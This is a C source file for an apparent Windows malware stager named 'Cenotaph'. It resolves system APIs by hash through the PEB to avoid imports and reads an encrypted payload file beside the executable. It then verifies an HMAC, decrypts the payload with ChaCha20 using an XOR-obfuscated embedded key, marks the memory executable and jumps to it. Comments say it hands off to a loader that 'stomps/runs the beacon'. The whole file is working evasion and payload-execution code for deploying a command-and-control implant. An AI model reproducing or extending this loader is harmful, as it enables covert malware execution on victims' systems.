#include "Cenotaph.h"
#include "CenKey.h"

/* Debug build: import console APIs directly via IAT so we can print
 * progress even if our runtime PEB resolver is broken. */
#if CENOTAPH_DEBUG
extern "C" __declspec(dllimport) HANDLE __stdcall GetStdHandle( DWORD nStdHandle );
extern "C" __declspec(dllimport) BOOL   __stdcall WriteConsoleA( HANDLE hConsoleOutput, const void* lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved );
#endif

static struct {
    PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
    PFN_NtProtectVirtualMemory  NtProtectVirtualMemory;
    PFN_NtClose                 NtClose;
    PFN_GetModuleFileNameW      GetModuleFileNameW;
    PFN_CreateFileW             CreateFileW;
    PFN_ReadFile                ReadFile;
    PFN_GetFileSize             GetFileSize;
    PFN_Sleep                   Sleep;
} g_Api;

static PVOID g_Ntdll = NULL;
static PVOID g_Kernel32 = NULL;

/* Keep large buffers out of the stack so the no-CRT binary never needs
 * the compiler-generated ___chkstk_ms probe. */
static WCHAR g_PayloadPath[ CEN_PATH_CAP ];
static WCHAR g_ExePath[ 1024 ];

extern "C" void ___chkstk_ms( void ) { }

#if CENOTAPH_DEBUG
static void CenDbg( const char* msg ) {
    HANDLE hOut = GetStdHandle( (DWORD)-11 );
    if ( hOut && hOut != (HANDLE)(LONG_PTR)-1 ) {
        DWORD len = 0;
        while ( msg[len] ) len++;
        if ( len ) WriteConsoleA( hOut, msg, len, &len, NULL );
    }
}
static void CenDbgNL( void ) { CenDbg( "\r\n" ); }
/* Debug-only hex dump (max 32 bytes shown). */
static void CenDbgHex( PUCHAR p, DWORD n ) {
    static const char H[] = "0123456789abcdef";
    char out[ 193 ];
    DWORD i, o = 0;
    for ( i = 0; i < n && i < 64; i++ ) {
        out[ o++ ] = H[ p[i] >> 4 ];
        out[ o++ ] = H[ p[i] & 0xF ];
        out[ o++ ] = ' ';
    }
    out[ o ] = 0;
    CenDbg( out );
}
#else
#define CenDbg(x)  ((void)0)
#define CenDbgNL() ((void)0)
#define CenDbgHex(p,n) ((void)0)
#endif

static void CenZero( PVOID dst, SIZE_T n ) {
    PUCHAR p = (PUCHAR)dst;
    while ( n-- ) *p++ = 0;
}

static void CenMemCpy( PVOID dst, const void* src, SIZE_T n ) {
    PUCHAR d = (PUCHAR)dst;
    const UCHAR* s = (const UCHAR*)src;
    while ( n-- ) *d++ = *s++;
}

static int CenMemCmp( const void* a, const void* b, SIZE_T n ) {
    const UCHAR* x = (const UCHAR*)a;
    const UCHAR* y = (const UCHAR*)b;
    while ( n-- ) {
        if ( *x != *y ) return (int)*x - (int)*y;
        x++; y++;
    }
    return 0;
}

/* ------------------------------------------------------------------ *
 *  Crypto: ChaCha20 IETF + SHA-256 + HMAC-SHA256.
 * ------------------------------------------------------------------ */
static inline DWORD CenRol32( DWORD x, int n ) { return ( x << n ) | ( x >> ( 32 - n ) ); }
static inline DWORD CenRor32( DWORD x, int n ) { return ( x >> n ) | ( x << ( 32 - n ) ); }

static inline DWORD CenU8To32( const UCHAR* p ) {
    return (DWORD)p[0] | ( (DWORD)p[1] << 8 ) | ( (DWORD)p[2] << 16 ) | ( (DWORD)p[3] << 24 );
}

static inline void CenU32To8( UCHAR* p, DWORD v ) {
    p[0] = (UCHAR)v; p[1] = (UCHAR)( v >> 8 ); p[2] = (UCHAR)( v >> 16 ); p[3] = (UCHAR)( v >> 24 );
}

/* Big-endian word access — SHA-256 is specified BE; ChaCha keeps the LE
 * helpers above.  Crossover here is exactly the bug class that cost a day. */
static inline DWORD CenU8To32BE( const UCHAR* p ) {
    return ( (DWORD)p[0] << 24 ) | ( (DWORD)p[1] << 16 ) | ( (DWORD)p[2] << 8 ) | (DWORD)p[3];
}

static inline void CenU32To8BE( UCHAR* p, DWORD v ) {
    p[0] = (UCHAR)( v >> 24 ); p[1] = (UCHAR)( v >> 16 ); p[2] = (UCHAR)( v >> 8 ); p[3] = (UCHAR)v;
}

#define CEN_QR(a,b,c,d) \
    a += b; d ^= a; d = CenRol32(d, 16); \
    c += d; b ^= c; b = CenRol32(b, 12); \
    a += b; d ^= a; d = CenRol32(d,  8); \
    c += d; b ^= c; b = CenRol32(b,  7);

static void CenChaChaBlock( const UCHAR key[32], const UCHAR nonce[12], DWORD counter, UCHAR out[64] ) {
    DWORD x[16];
    const UCHAR* sigma = (const UCHAR*)"expand 32-byte k";
    x[0]  = CenU8To32(sigma + 0);  x[1]  = CenU8To32(sigma + 4);
    x[2]  = CenU8To32(sigma + 8);  x[3]  = CenU8To32(sigma + 12);
    x[4]  = CenU8To32(key + 0);    x[5]  = CenU8To32(key + 4);
    x[6]  = CenU8To32(key + 8);    x[7]  = CenU8To32(key + 12);
    x[8]  = CenU8To32(key + 16);   x[9]  = CenU8To32(key + 20);
    x[10] = CenU8To32(key + 24);   x[11] = CenU8To32(key + 28);
    x[12] = counter;
    x[13] = CenU8To32(nonce + 0);
    x[14] = CenU8To32(nonce + 4);
    x[15] = CenU8To32(nonce + 8);

    DWORD w[16];
    CenMemCpy( w, x, sizeof(w) );
    for ( int i = 0; i < 10; i++ ) {
        CEN_QR(w[0], w[4], w[ 8], w[12]); CEN_QR(w[1], w[5], w[ 9], w[13]);
        CEN_QR(w[2], w[6], w[10], w[14]); CEN_QR(w[3], w[7], w[11], w[15]);
        CEN_QR(w[0], w[5], w[10], w[15]); CEN_QR(w[1], w[6], w[11], w[12]);
        CEN_QR(w[2], w[7], w[ 8], w[13]); CEN_QR(w[3], w[4], w[ 9], w[14]);
    }
    for ( int i = 0; i < 16; i++ ) w[i] += x[i];
    for ( int i = 0; i < 16; i++ ) CenU32To8( out + 4 * i, w[i] );
}

/* XOR stream in place.  counter_start MUST be 0: encrypt.py emits an
 * RFC 7539 IETF stream whose first keystream block is counter 0
 * (pycryptodome 12-byte-nonce mode).  counter 1 here was v2's latent
 * decrypt-garbles-payload bug.
 * ponytail: fixed offset, change both sides together if this moves. */
static void CenChaChaCrypt( const UCHAR key[32], const UCHAR nonce[12], UCHAR* data, SIZE_T len, DWORD counter_start ) {
    UCHAR block[64];
    DWORD counter = counter_start;
    SIZE_T i = 0;
    while ( i < len ) {
        CenChaChaBlock( key, nonce, counter++, block );
        SIZE_T chunk = ( len - i < 64 ) ? ( len - i ) : 64;
        for ( SIZE_T j = 0; j < chunk; j++ ) data[i + j] ^= block[j];
        i += chunk;
    }
}

/* SHA-256 */
#if CENOTAPH_DEBUG
static int g_CenShaTrace;   /* debug: print a..h of rounds 0-2 in the next transform */
#endif
typedef struct _CEN_SHA256_CTX {
    DWORD state[8];
    UCHAR buf[64];
    DWORD len;
    DWORD tot_len;
} CEN_SHA256_CTX;

static const DWORD CenK256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

static inline DWORD CenShaCh(DWORD x, DWORD y, DWORD z){ return (x & y) ^ (~x & z); }
static inline DWORD CenShaMaj(DWORD x, DWORD y, DWORD z){ return (x & y) ^ (x & z) ^ (y & z); }
static inline DWORD CenShaEp0(DWORD x){ return CenRor32(x,2) ^ CenRor32(x,13) ^ CenRor32(x,22); }
static inline DWORD CenShaEp1(DWORD x){ return CenRor32(x,6) ^ CenRor32(x,11) ^ CenRor32(x,25); }
static inline DWORD CenShaSig0(DWORD x){ return CenRor32(x,7) ^ CenRor32(x,18) ^ (x >> 3); }
static inline DWORD CenShaSig1(DWORD x){ return CenRor32(x,17) ^ CenRor32(x,19) ^ (x >> 10); }

static void CenSha256Transform( CEN_SHA256_CTX* ctx, const UCHAR* data ) {
    DWORD a,b,c,d,e,f,g,h,t1,t2,m[64];
    for ( int i = 0; i < 16; i++ ) m[i] = CenU8To32BE( data + 4 * i );
    for ( int i = 16; i < 64; i++ ) m[i] = CenShaSig1(m[i-2]) + m[i-7] + CenShaSig0(m[i-15]) + m[i-16];
    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];
    for ( int i = 0; i < 64; i++ ) {
        t1 = h + CenShaEp1(e) + CenShaCh(e,f,g) + CenK256[i] + m[i];
        t2 = CenShaEp0(a) + CenShaMaj(a,b,c);
        h = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
#if CENOTAPH_DEBUG
        if ( g_CenShaTrace && i < 3 ) {
            UCHAR r8[ 32 ];
            CenU32To8( r8 +  0, a ); CenU32To8( r8 +  4, b );
            CenU32To8( r8 +  8, c ); CenU32To8( r8 + 12, d );
            CenU32To8( r8 + 16, e ); CenU32To8( r8 + 20, f );
            CenU32To8( r8 + 24, g ); CenU32To8( r8 + 28, h );
            CenDbg( i == 0 ? "  r0    =" : i == 1 ? "  r1    =" : "  r2    =" );
            CenDbgHex( r8, 32 ); CenDbgNL();
        }
#endif
    }
    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void CenSha256Init( CEN_SHA256_CTX* ctx ) {
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
    ctx->len = 0; ctx->tot_len = 0;
}

static void CenSha256Update( CEN_SHA256_CTX* ctx, const UCHAR* data, DWORD len ) {
    for ( DWORD i = 0; i < len; i++ ) {
        ctx->buf[ctx->len++] = data[i];
        ctx->tot_len++;
        if ( ctx->len == 64 ) {
            CenSha256Transform( ctx, ctx->buf );
            ctx->len = 0;
        }
    }
}

static void CenSha256Final( CEN_SHA256_CTX* ctx, UCHAR hash[32] ) {
    /* 64-bit: the length shifts below run past 32 bits, and a 32-bit shift
     * count >= width is UB - mingw emits runtime `shr %cl` (5-bit mask),
     * which wrote the 32-bit length twice and corrupted every HMAC.
     * Found via the battery: sha-abc = 9c0056b1... (0x18 at buf[59]). */
    unsigned long long tot_bits = (unsigned long long)ctx->tot_len * 8ULL;
    UCHAR pad = 0x80;
    CenSha256Update( ctx, &pad, 1 );
    while ( ctx->len != 56 ) {
        pad = 0;
        CenSha256Update( ctx, &pad, 1 );
    }
    UCHAR len_buf[8];
    for ( int i = 0; i < 8; i++ ) len_buf[i] = (UCHAR)( tot_bits >> ( 56 - i * 8 ) );
    CenSha256Update( ctx, len_buf, 8 );
    for ( int i = 0; i < 8; i++ ) CenU32To8BE( hash + 4 * i, ctx->state[i] );
}

static void CenHmacSha256( const UCHAR* key, DWORD klen, const UCHAR* msg, DWORD mlen, UCHAR out[32] ) {
    UCHAR k[64], i_pad[64], o_pad[64];
    CEN_SHA256_CTX ctx;
    CenZero( k, 64 );
    if ( klen > 64 ) {
        CenSha256Init( &ctx ); CenSha256Update( &ctx, key, klen ); CenSha256Final( &ctx, k );
    } else {
        CenMemCpy( k, key, klen );
    }
    for ( int i = 0; i < 64; i++ ) { i_pad[i] = k[i] ^ 0x36; o_pad[i] = k[i] ^ 0x5c; }
    CenSha256Init( &ctx ); CenSha256Update( &ctx, i_pad, 64 ); CenSha256Update( &ctx, msg, mlen ); CenSha256Final( &ctx, out );
    CenSha256Init( &ctx ); CenSha256Update( &ctx, o_pad, 64 ); CenSha256Update( &ctx, out, 32 ); CenSha256Final( &ctx, out );
}

/* Recover the real ChaCha/HMAC key from the XOR-obfuscated CenKey.h blob. */
static void CenGetKey( UCHAR key[32] ) {
    for ( int i = 0; i < 32; i++ )
        key[i] = EKEY[i] ^ CEN_OBF_BYTE;
}

static int CenResolve( void ) {
    g_Ntdll    = CenLdrModulePeb( H_MODULE_NTDLL );
    g_Kernel32 = CenLdrModulePeb( H_MODULE_KERNEL32 );
    if ( ! g_Ntdll || ! g_Kernel32 )
        return 0;

    g_Api.NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)CenLdrFunction( g_Ntdll, 0xd58d5a18 );
    g_Api.NtProtectVirtualMemory  = (PFN_NtProtectVirtualMemory) CenLdrFunction( g_Ntdll, 0x069ff566 );
    g_Api.NtClose                 = (PFN_NtClose)                CenLdrFunction( g_Ntdll, 0x1498d8a5 );

    g_Api.GetModuleFileNameW = (PFN_GetModuleFileNameW)CenLdrFunction( g_Kernel32, 0x34f76bdb );
    g_Api.CreateFileW        = (PFN_CreateFileW)       CenLdrFunction( g_Kernel32, 0xda4b2484 );
    g_Api.ReadFile           = (PFN_ReadFile)          CenLdrFunction( g_Kernel32, 0xbc5c02c3 );
    g_Api.GetFileSize        = (PFN_GetFileSize)       CenLdrFunction( g_Kernel32, 0x7c072ed8 );
    g_Api.Sleep              = (PFN_Sleep)             CenLdrFunction( g_Kernel32, 0x6d3d9a28 );

    return g_Api.NtAllocateVirtualMemory && g_Api.NtProtectVirtualMemory && g_Api.NtClose &&
           g_Api.GetModuleFileNameW && g_Api.CreateFileW && g_Api.ReadFile &&
           g_Api.GetFileSize && g_Api.Sleep;
}

static int CenBuildPayloadPath( LPWSTR out, DWORD cap ) {
    DWORD n = g_Api.GetModuleFileNameW( NULL, g_ExePath, 1024 );
    DWORD i, sep = 0, dot = 0;

    if ( ! n || n >= 1024 )
        return 0;

    for ( i = 0; i < n && g_ExePath[i]; i++ ) {
        if ( g_ExePath[i] == L'\\' || g_ExePath[i] == L'/' ) { sep = i; dot = 0; }
        else if ( g_ExePath[i] == L'.' )                     { dot = i; }
    }

    if ( ( sep + 1 ) + 64 > cap )
        return 0;

    for ( i = 0; i <= sep; i++ )
        out[i] = g_ExePath[i];

    DWORD stemStart = sep + 1;
    DWORD stemEnd   = ( dot > stemStart ) ? dot : n;
    DWORD o = sep + 1;
    for ( i = stemStart; i < stemEnd; i++ )
        out[ o++ ] = g_ExePath[i];

    out[ o++ ] = L'.'; out[ o++ ] = L'd'; out[ o++ ] = L'a'; out[ o++ ] = L't';
    out[ o ] = L'\0';
    return 1;
}

/* Read the encrypted payload file (nonce || ciphertext || hmac) into RW memory. */
static PVOID CenReadPayload( LPCWSTR path, DWORD *pSize ) {
    HANDLE hFile;
    PVOID  buf = NULL;
    DWORD  fsz, rd;
    SIZE_T alloc, region;
    NTSTATUS st;

    hFile = g_Api.CreateFileW( path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE )
        return NULL;

    fsz = g_Api.GetFileSize( hFile, NULL );
    if ( fsz < 12 + 1 + 32 || fsz == INVALID_FILE_SIZE || fsz > CEN_MAX_PAYLOAD ) {
        g_Api.NtClose( hFile );
        return NULL;
    }

    alloc = ( (SIZE_T)fsz + 0xFFF ) & ~(SIZE_T)0xFFF;
    region = alloc;
    st = g_Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1, &buf, 0, &region,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( ! NT_SUCCESS( st ) || ! buf ) {
        g_Api.NtClose( hFile );
        return NULL;
    }

    if ( ! g_Api.ReadFile( hFile, buf, fsz, &rd, NULL ) || rd != fsz ) {
        g_Api.NtClose( hFile );
        return NULL;
    }
    g_Api.NtClose( hFile );

    *pSize = fsz;
    return buf;
}

/* Verify HMAC, decrypt into fresh RW memory, flip RX, hand off.
 * .dat layout (per tools/encrypt.py): nonce(12) || ciphertext || hmac(32)
 */
static VOID CenDecryptAndRun( PVOID blob, DWORD fileSize ) {
    UCHAR  key[ 32 ];
    UCHAR  hmac[ 32 ];
    DWORD  payloadLen = fileSize - 12 - 32;
    PUCHAR nonce     = (PUCHAR)blob;
    PUCHAR cipher    = nonce + 12;
    PUCHAR storedMac = cipher + payloadLen;
    PVOID  exec = NULL;
    SIZE_T execSz, region;
    ULONG  oldProt = 0;
    NTSTATUS st;

#if CENOTAPH_DEBUG
    /* Self-test battery. Canonical refs (computed with python hashlib/hmac,
     * NOT hand-copied):
     *   sha256("abc") = ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
     *   hmac("key", "The quick brown fox jumps over the lazy dog")
     *       = f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8
     * Layer decode: first diverging line names the failing layer —
     *   H0     : Init constants wrong
     *   blk    : padded block content wrong (Final padding path)
     *   r0/r1/r2: per-round a..h after rounds 0/1/2 (transform-internal)
     *   tstate : state after the one direct Transform call
     *   sha-abc: end-to-end Update/Final
     *   hmac-kr: HMAC scaffolding (ipad/opad/outer) on a canonical vector */
    {
        CEN_SHA256_CTX t;
        UCHAR blk[ 64 ], tp[ 32 ];
        UCHAR tv[ 3 ] = { 'a', 'b', 'c' };
        CenZero( blk, sizeof(blk) );
        blk[ 0 ] = 'a'; blk[ 1 ] = 'b'; blk[ 2 ] = 'c';
        blk[ 3 ] = 0x80; blk[ 63 ] = 0x18;

        CenSha256Init( &t );
        CenDbg( "H0      =" ); CenDbgHex( (PUCHAR)t.state, 32 ); CenDbgNL();
        CenDbg( "blk     =" ); CenDbgHex( blk, 64 ); CenDbgNL();
        g_CenShaTrace = 1;
        CenSha256Transform( &t, blk );
        g_CenShaTrace = 0;
        CenDbg( "tstate  =" ); CenDbgHex( (PUCHAR)t.state, 32 ); CenDbgNL();

        CenSha256Init( &t );
        CenSha256Update( &t, tv, 3 );
        CenSha256Final( &t, tp );
        CenDbg( "sha-abc =" ); CenDbgHex( tp, 32 ); CenDbgNL();

        {
            const UCHAR hk[] = "key";
            const UCHAR hm[] = "The quick brown fox jumps over the lazy dog";
            UCHAR hs[ 32 ];
            CenHmacSha256( hk, 3, hm, 43, hs );
            CenDbg( "hmac-kr =" ); CenDbgHex( hs, 32 ); CenDbgNL();
        }
    }
#endif

    CenGetKey( key );

    /* HMAC over nonce || ciphertext */
    CenHmacSha256( key, 32, nonce, (DWORD)( 12 + payloadLen ), hmac );
    if ( CenMemCmp( hmac, storedMac, 32 ) != 0 ) {
        CenDbg( "[cen v3] hmac fail" ); CenDbgNL();
        CenDbg( "  filesize=" ); CenDbgHex( (PUCHAR)&fileSize, 4 ); CenDbgNL();
        CenDbg( "  nonce  =" ); CenDbgHex( nonce, 12 ); CenDbgNL();
        CenDbg( "  key    =" ); CenDbgHex( key, 32 ); CenDbgNL();
        CenDbg( "  calc-mac" ); CenDbgHex( hmac, 32 ); CenDbgNL();
        CenDbg( "  disk-mac" ); CenDbgHex( storedMac, 32 ); CenDbgNL();
        CenZero( key, sizeof(key) );
        return;
    }
    CenDbg( "[cen v3] hmac ok" ); CenDbgNL();

    execSz = ( (SIZE_T)payloadLen + 0xFFF ) & ~(SIZE_T)0xFFF;
    region = execSz;
    st = g_Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1, &exec, 0, &region,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( ! NT_SUCCESS( st ) || ! exec ) {
        CenZero( key, sizeof(key) );
        return;
    }

    CenMemCpy( exec, cipher, payloadLen );
    CenChaChaCrypt( key, nonce, (PUCHAR)exec, payloadLen, 0 );

    /* Scrub the on-disk ciphertext copy and key material */
    CenZero( blob, fileSize );
    CenZero( key, sizeof(key) );

    {
        PVOID base = exec;
        SIZE_T span = region;
        if ( ! NT_SUCCESS( g_Api.NtProtectVirtualMemory( (HANDLE)(LONG_PTR)-1,
                            &base, &span, PAGE_EXECUTE_READ, &oldProt ) ) ) {
            CenDbg( "[cen v3] rx failed" ); CenDbgNL();
            return;
        }
    }
    CenDbg( "[cen v3] decrypt+rx ok" ); CenDbgNL();

    /* Hand off to the NaX loader Start stub at offset 0.  The loader sets up
     * its own stack frame, resolves its own APIs, and stomps/runs the beacon
     * on its own worker thread. */
    CenDbg( "[cen v3] dispatch" ); CenDbgNL();
    ( (VOID (*)(VOID)) exec )();
}

extern "C" VOID CenotaphEntry( void ) {
    PVOID    blob = NULL;
    DWORD    fileSize = 0;

    CenZero( &g_Api, sizeof(g_Api) );

    CenDbg( "[cen v3] entry" ); CenDbgNL();

    if ( ! CenResolve() ) {
        CenDbg( "[cen v3] resolve failed" ); CenDbgNL();
        return;
    }
    CenDbg( "[cen v3] resolve ok" ); CenDbgNL();

    if ( ! CenBuildPayloadPath( g_PayloadPath, CEN_PATH_CAP ) ) {
        CenDbg( "[cen v3] path failed" ); CenDbgNL();
        return;
    }
    CenDbg( "[cen v3] path ok" ); CenDbgNL();

    blob = CenReadPayload( g_PayloadPath, &fileSize );
    if ( ! blob ) {
        CenDbg( "[cen v3] read failed" ); CenDbgNL();
        return;
    }
    CenDbg( "[cen v3] read ok" ); CenDbgNL();

    CenDecryptAndRun( blob, fileSize );

    /* Keep main thread alive so the process survives. */
    CenDbg( "[cen v3] sleeping" ); CenDbgNL();
    g_Api.Sleep( INFINITE );
}